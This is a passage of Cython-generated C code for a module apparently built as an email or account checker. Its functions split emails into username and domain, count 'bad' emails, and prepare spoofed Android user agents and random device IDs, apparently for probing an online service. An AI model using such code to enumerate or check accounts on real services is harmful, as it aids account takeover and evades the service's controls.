__Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n            __pyx_t_13 = 0;\n          }\n          #endif\n          {\n            PyObject *__pyx_callargs[3] = {__pyx_t_14, __pyx_v_username, __pyx_v_gg};\n            __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_13, (3-__pyx_t_13) | (__pyx_t_13*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 327, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_10);\n          }\n          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n\n          \n          goto __pyx_L21;\n        }\n\n        \n         {\n          __pyx_t_5 = __pyx_v_email;\n          __Pyx_INCREF(__pyx_t_5);\n          __pyx_t_13 = 0;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_mstate_global->__pyx_kp_u__10};\n            __pyx_t_10 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_split, __pyx_callargs+__pyx_t_13, (2-__pyx_t_13) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 329, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_10);\n          }\n          if ((likely(PyTuple_CheckExact(__pyx_t_10))) || (PyList_CheckExact(__pyx_t_10))) {\n            PyObject* sequence = __pyx_t_10;\n            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);\n            if (unlikely(size != 2)) {\n              if (size > 2) __Pyx_RaiseTooManyValuesError(2);\n              else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);\n              __PYX_ERR(0, 329, __pyx_L3_error)\n            }\n            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n            if (likely(PyTuple_CheckExact(sequence))) {\n              __pyx_t_5 = PyTuple_GET_ITEM(sequence, 0);\n              __Pyx_INCREF(__pyx_t_5);\n              __pyx_t_14 = PyTuple_GET_ITEM(sequence, 1);\n              __Pyx_INCREF(__pyx_t_14);\n            } else {\n              __pyx_t_5 = __Pyx_PyList_GetItemRef(sequence, 0);\n              if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 329, __pyx_L3_error)\n              __Pyx_XGOTREF(__pyx_t_5);\n              __pyx_t_14 = __Pyx_PyList_GetItemRef(sequence, 1);\n              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 329, __pyx_L3_error)\n              __Pyx_XGOTREF(__pyx_t_14);\n            }\n            #else\n            __pyx_t_5 = __Pyx_PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 329, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_5);\n            __pyx_t_14 = __Pyx_PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 329, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_14);\n            #endif\n            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n          } else {\n            Py_ssize_t index = -1;\n            __pyx_t_6 = PyObject_GetIter(__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 329, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_6);\n            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n            __pyx_t_17 = (CYTHON_COMPILING_IN_LIMITED_API) ? PyIter_Next : __Pyx_PyObject_GetIterNextFunc(__pyx_t_6);\n            index = 0; __pyx_t_5 = __pyx_t_17(__pyx_t_6); if (unlikely(!__pyx_t_5)) goto __pyx_L24_unpacking_failed;\n            __Pyx_GOTREF(__pyx_t_5);\n            index = 1; __pyx_t_14 = __pyx_t_17(__pyx_t_6); if (unlikely(!__pyx_t_14)) goto __pyx_L24_unpacking_failed;\n            __Pyx_GOTREF(__pyx_t_14);\n            if (__Pyx_IternextUnpackEndCheck(__pyx_t_17(__pyx_t_6), 2) < (0)) __PYX_ERR(0, 329, __pyx_L3_error)\n            __pyx_t_17 = NULL;\n            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n            goto __pyx_L25_unpacking_done;\n            __pyx_L24_unpacking_failed:;\n            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n            __pyx_t_17 = NULL;\n            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);\n            __PYX_ERR(0, 329, __pyx_L3_error)\n            __pyx_L25_unpacking_done:;\n          }\n          __pyx_v_username = __pyx_t_5;\n          __pyx_t_5 = 0;\n          __pyx_v_gg = __pyx_t_14;\n          __pyx_t_14 = 0;\n\n          \n          __pyx_t_14 = NULL;\n          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_InfoAcc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 330, __pyx_L3_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __pyx_t_13 = 1;\n          #if CYTHON_UNPACK_METHODS\n          if (unlikely(PyMethod_Check(__pyx_t_5))) {\n            __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_5);\n            assert(__pyx_t_14);\n            PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_5);\n            __Pyx_INCREF(__pyx_t_14);\n            __Pyx_INCREF(__pyx__function);\n            __Pyx_DECREF_SET(__pyx_t_5, __pyx__function);\n            __pyx_t_13 = 0;\n          }\n          #endif\n          {\n            PyObject *__pyx_callargs[3] = {__pyx_t_14, __pyx_v_username, __pyx_v_gg};\n            __pyx_t_10 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_13, (3-__pyx_t_13) | (__pyx_t_13*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 330, __pyx_L3_error)\n            __Pyx_GOTREF(__pyx_t_10);\n          }\n          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        }\n        __pyx_L21:;\n\n        \n        goto __pyx_L20;\n      }\n\n      \n       {\n        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_bademail); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 332, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_10);\n        __pyx_t_5 = __Pyx_PyLong_AddObjC(__pyx_t_10, __pyx_mstate_global->__pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 332, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_bademail, __pyx_t_5) < (0)) __PYX_ERR(0, 332, __pyx_L3_error)\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n        \n        __pyx_t_10 = NULL;\n        __Pyx_GetModuleGlobalName(__pyx_t_14, __pyx_mstate_global->__pyx_n_u_pppp); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 333, __pyx_L3_error)\n        __Pyx_GOTREF(__pyx_t_14);\n        __pyx_t_13 = 1;\n        #if CYTHON_UNPACK_METHODS\n        if (unlikely(PyMethod_Check(__pyx_t_14))) {\n          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_14);\n          assert(__pyx_t_10);\n          PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_14);\n          __Pyx_INCREF(__pyx_t_10);\n          __Pyx_INCREF(__pyx__function);\n          __Pyx_DECREF_SET(__pyx_t_14, __pyx__function);\n          __pyx_t_13 = 0;\n        }\n        #endif\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};\n          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+__pyx_t_13, (1-__pyx_t_13) | (__pyx_t_13*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 333, __pyx_L3_error)\n          __Pyx_GOTREF(__pyx_t_5);\n        }\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      }\n      __pyx_L20:;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    goto __pyx_L8_try_end;\n    __pyx_L3_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\n\n    \n     {\n      __Pyx_ErrRestore(0,0,0);\n      goto __pyx_L4_exception_handled;\n    }\n    __pyx_L4_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_2);\n    __Pyx_XGIVEREF(__pyx_t_3);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);\n    __pyx_L8_try_end:;\n  }\n\n  \n\n  \n  __pyx_r = Py_None; __Pyx_INCREF(Py_None);\n  __Pyx_XDECREF(__pyx_v_o);\n  __Pyx_XDECREF(__pyx_v_tl);\n  __Pyx_XDECREF(__pyx_v_host);\n  __Pyx_XDECREF(__pyx_v_cookies);\n  __Pyx_XDECREF(__pyx_v_headers);\n  __Pyx_XDECREF(__pyx_v_params);\n  __Pyx_XDECREF(__pyx_v_data);\n  __Pyx_XDECREF(__pyx_v_response);\n  __Pyx_XDECREF(__pyx_v_ok);\n  __Pyx_XDECREF(__pyx_v_username);\n  __Pyx_XDECREF(__pyx_v_gg);\n  __Pyx_XDECREF(__pyx_v_email);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_13format_number(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n); \nstatic PyMethodDef __pyx_mdef_2op_13format_number = {"format_number", (PyCFunction)(void(*)(void))(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_2op_13format_number, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};\nstatic PyObject *__pyx_pw_2op_13format_number(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n) {\n  PyObject *__pyx_v_value = 0;\n  #if !CYTHON_METH_FASTCALL\n  CYTHON_UNUSED Py_ssize_t __pyx_nargs;\n  #endif\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject* values[1] = {0};\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("format_number (wrapper)", 0);\n  #if !CYTHON_METH_FASTCALL\n  #if CYTHON_ASSUME_SAFE_SIZE\n  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);\n  #else\n  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;\n  #endif\n  #endif\n  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);\n  {\n    PyObject ** const __pyx_pyargnames[] = {&__pyx_mstate_global->__pyx_n_u_value,0};\n    const Py_ssize_t __pyx_kwds_len = (__pyx_kwds) ? __Pyx_NumKwargs_FASTCALL(__pyx_kwds) : 0;\n    if (unlikely(__pyx_kwds_len) < 0) __PYX_ERR(0, 338, __pyx_L3_error)\n    if (__pyx_kwds_len > 0) {\n      switch (__pyx_nargs) {\n        case  1:\n        values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n        if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 338, __pyx_L3_error)\n        CYTHON_FALLTHROUGH;\n        case  0: break;\n        default: goto __pyx_L5_argtuple_error;\n      }\n      const Py_ssize_t kwd_pos_args = __pyx_nargs;\n      if (__Pyx_ParseKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values, kwd_pos_args, __pyx_kwds_len, "format_number", 0) < (0)) __PYX_ERR(0, 338, __pyx_L3_error)\n      for (Py_ssize_t i = __pyx_nargs; i < 1; i++) {\n        if (unlikely(!values[i])) { __Pyx_RaiseArgtupleInvalid("format_number", 1, 1, 1, i); __PYX_ERR(0, 338, __pyx_L3_error) }\n      }\n    } else if (unlikely(__pyx_nargs != 1)) {\n      goto __pyx_L5_argtuple_error;\n    } else {\n      values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n      if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 338, __pyx_L3_error)\n    }\n    __pyx_v_value = values[0];\n  }\n  goto __pyx_L6_skip;\n  __pyx_L5_argtuple_error:;\n  __Pyx_RaiseArgtupleInvalid("format_number", 1, 1, 1, __pyx_nargs); __PYX_ERR(0, 338, __pyx_L3_error)\n  __pyx_L6_skip:;\n  goto __pyx_L4_argument_unpacking_done;\n  __pyx_L3_error:;\n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_AddTraceback("op.format_number", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __Pyx_RefNannyFinishContext();\n  return NULL;\n  __pyx_L4_argument_unpacking_done:;\n  __pyx_r = __pyx_pf_2op_12format_number(__pyx_self, __pyx_v_value);\n\n  \n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_12format_number(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_value) {\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  int __pyx_t_2;\n  PyObject *__pyx_t_3 = NULL;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("format_number", 0);\n  __Pyx_INCREF(__pyx_v_value);\n\n  \n  __pyx_t_1 = __Pyx_PyNumber_Float(__pyx_v_value); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 339, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __Pyx_DECREF_SET(__pyx_v_value, __pyx_t_1);\n  __pyx_t_1 = 0;\n\n  \n  __pyx_t_1 = PyObject_RichCompare(__pyx_v_value, __pyx_mstate_global->__pyx_int_1000000, Py_GE); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 340, __pyx_L1_error)\n  __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely((__pyx_t_2 < 0))) __PYX_ERR(0, 340, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (__pyx_t_2) {\n\n    \n    __Pyx_XDECREF(__pyx_r);\n    __pyx_t_1 = __Pyx_PyLong_TrueDivideObjC(__pyx_v_value, __pyx_mstate_global->__pyx_int_1000000, 0xF4240, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 341, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_3 = __Pyx_PyObject_Format(__pyx_t_1, __pyx_mstate_global->__pyx_kp_u_1f); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 341, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_1 = __Pyx_PyUnicode_ConcatInPlace(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_m); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 341, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_r = __pyx_t_1;\n    __pyx_t_1 = 0;\n    goto __pyx_L0;\n\n    \n  }\n\n  \n  __pyx_t_1 = PyObject_RichCompare(__pyx_v_value, __pyx_mstate_global->__pyx_int_1000, Py_GE); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 342, __pyx_L1_error)\n  __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely((__pyx_t_2 < 0))) __PYX_ERR(0, 342, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  if (__pyx_t_2) {\n\n    \n    __Pyx_XDECREF(__pyx_r);\n    __pyx_t_1 = __Pyx_PyLong_TrueDivideObjC(__pyx_v_value, __pyx_mstate_global->__pyx_int_1000, 0x3E8, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 343, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __pyx_t_3 = __Pyx_PyObject_Format(__pyx_t_1, __pyx_mstate_global->__pyx_kp_u_1f); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 343, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __pyx_t_1 = __Pyx_PyUnicode_ConcatInPlace(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_k); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 343, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __pyx_r = __pyx_t_1;\n    __pyx_t_1 = 0;\n    goto __pyx_L0;\n\n    \n  }\n\n  \n  __Pyx_XDECREF(__pyx_r);\n  __pyx_t_1 = __Pyx_PyNumber_Int(__pyx_v_value); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 344, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_1);\n  __pyx_t_3 = __Pyx_PyObject_Unicode(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 344, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;\n  __pyx_r = __pyx_t_3;\n  __pyx_t_3 = 0;\n  goto __pyx_L0;\n\n  \n\n  \n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_1);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_AddTraceback("op.format_number", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __pyx_r = NULL;\n  __pyx_L0:;\n  __Pyx_XDECREF(__pyx_v_value);\n  __Pyx_XGIVEREF(__pyx_r);\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\n\n\n\nstatic PyObject *__pyx_pw_2op_15check_on(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n); \nstatic PyMethodDef __pyx_mdef_2op_15check_on = {"check_on", (PyCFunction)(void(*)(void))(__Pyx_PyCFunction_FastCallWithKeywords)__pyx_pw_2op_15check_on, __Pyx_METH_FASTCALL|METH_KEYWORDS, 0};\nstatic PyObject *__pyx_pw_2op_15check_on(PyObject *__pyx_self, \n#if CYTHON_METH_FASTCALL\nPyObject *const *__pyx_args, Py_ssize_t __pyx_nargs, PyObject *__pyx_kwds\n#else\nPyObject *__pyx_args, PyObject *__pyx_kwds\n#endif\n) {\n  PyObject *__pyx_v_email = 0;\n  #if !CYTHON_METH_FASTCALL\n  CYTHON_UNUSED Py_ssize_t __pyx_nargs;\n  #endif\n  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;\n  PyObject* values[1] = {0};\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  PyObject *__pyx_r = 0;\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("check_on (wrapper)", 0);\n  #if !CYTHON_METH_FASTCALL\n  #if CYTHON_ASSUME_SAFE_SIZE\n  __pyx_nargs = PyTuple_GET_SIZE(__pyx_args);\n  #else\n  __pyx_nargs = PyTuple_Size(__pyx_args); if (unlikely(__pyx_nargs < 0)) return NULL;\n  #endif\n  #endif\n  __pyx_kwvalues = __Pyx_KwValues_FASTCALL(__pyx_args, __pyx_nargs);\n  {\n    PyObject ** const __pyx_pyargnames[] = {&__pyx_mstate_global->__pyx_n_u_email,0};\n    const Py_ssize_t __pyx_kwds_len = (__pyx_kwds) ? __Pyx_NumKwargs_FASTCALL(__pyx_kwds) : 0;\n    if (unlikely(__pyx_kwds_len) < 0) __PYX_ERR(0, 347, __pyx_L3_error)\n    if (__pyx_kwds_len > 0) {\n      switch (__pyx_nargs) {\n        case  1:\n        values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n        if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 347, __pyx_L3_error)\n        CYTHON_FALLTHROUGH;\n        case  0: break;\n        default: goto __pyx_L5_argtuple_error;\n      }\n      const Py_ssize_t kwd_pos_args = __pyx_nargs;\n      if (__Pyx_ParseKeywords(__pyx_kwds, __pyx_kwvalues, __pyx_pyargnames, 0, values, kwd_pos_args, __pyx_kwds_len, "check_on", 0) < (0)) __PYX_ERR(0, 347, __pyx_L3_error)\n      for (Py_ssize_t i = __pyx_nargs; i < 1; i++) {\n        if (unlikely(!values[i])) { __Pyx_RaiseArgtupleInvalid("check_on", 1, 1, 1, i); __PYX_ERR(0, 347, __pyx_L3_error) }\n      }\n    } else if (unlikely(__pyx_nargs != 1)) {\n      goto __pyx_L5_argtuple_error;\n    } else {\n      values[0] = __Pyx_ArgRef_FASTCALL(__pyx_args, 0);\n      if (!CYTHON_ASSUME_SAFE_MACROS && unlikely(!values[0])) __PYX_ERR(0, 347, __pyx_L3_error)\n    }\n    __pyx_v_email = values[0];\n  }\n  goto __pyx_L6_skip;\n  __pyx_L5_argtuple_error:;\n  __Pyx_RaiseArgtupleInvalid("check_on", 1, 1, 1, __pyx_nargs); __PYX_ERR(0, 347, __pyx_L3_error)\n  __pyx_L6_skip:;\n  goto __pyx_L4_argument_unpacking_done;\n  __pyx_L3_error:;\n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_AddTraceback("op.check_on", __pyx_clineno, __pyx_lineno, __pyx_filename);\n  __Pyx_RefNannyFinishContext();\n  return NULL;\n  __pyx_L4_argument_unpacking_done:;\n  __pyx_r = __pyx_pf_2op_14check_on(__pyx_self, __pyx_v_email);\n\n  \n  for (Py_ssize_t __pyx_temp=0; __pyx_temp < (Py_ssize_t)(sizeof(values)/sizeof(values[0])); ++__pyx_temp) {\n    Py_XDECREF(values[__pyx_temp]);\n  }\n  __Pyx_RefNannyFinishContext();\n  return __pyx_r;\n}\n\nstatic PyObject *__pyx_pf_2op_14check_on(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_email) {\n  PyObject *__pyx_v_ua = NULL;\n  PyObject *__pyx_v_dev = NULL;\n  PyObject *__pyx_v_device_id = NULL;\n  PyObject *__pyx_v_uui = NULL;\n  PyObject *__pyx_v_headers = NULL;\n  PyObject *__pyx_v_data = NULL;\n  PyObject *__pyx_v_response = NULL;\n  PyObject *__pyx_r = NULL;\n  __Pyx_RefNannyDeclarations\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  size_t __pyx_t_4;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  PyObject *__pyx_t_9 = NULL;\n  PyObject *__pyx_t_10 = NULL;\n  int __pyx_t_11;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannySetupContext("check_on", 0);\n\n  \n  __pyx_t_2 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_generate_user_agent); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 349, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_4 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_3))) {\n    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);\n    assert(__pyx_t_2);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_3);\n    __Pyx_INCREF(__pyx_t_2);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_3, __pyx__function);\n    __pyx_t_4 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};\n    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+__pyx_t_4, (1-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 349, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_1);\n  }\n  __pyx_v_ua = __pyx_t_1;\n  __pyx_t_1 = 0;\n\n  \n  __Pyx_INCREF(__pyx_mstate_global->__pyx_kp_u_android);\n  __pyx_v_dev = __pyx_mstate_global->__pyx_kp_u_android;\n\n  \n  __pyx_t_5 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_hashlib); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_6);\n  __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_mstate_global->__pyx_n_u_md5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_7);\n  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;\n  __pyx_t_8 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_uuid); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_9);\n  __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_uuid4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 351, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_10);\n  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n  __pyx_t_4 = 1;\n  #if CYTHON_UNPACK_METHODS\n  if (unlikely(PyMethod_Check(__pyx_t_10))) {\n    __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);\n    assert(__pyx_t_8);\n    PyObject* __pyx__function = PyMethod_GET_FUNCTION(__pyx_t_10);\n    __Pyx_INCREF(__pyx_t_8);\n    __Pyx_INCREF(__pyx__function);\n    __Pyx_DECREF_SET(__pyx_t_10, __pyx__function);\n    __pyx_t_4 = 0;\n  }\n  #endif\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_8, NULL};\n    __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_4, (1-__pyx_t_4) | (__pyx_t_4*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 351, 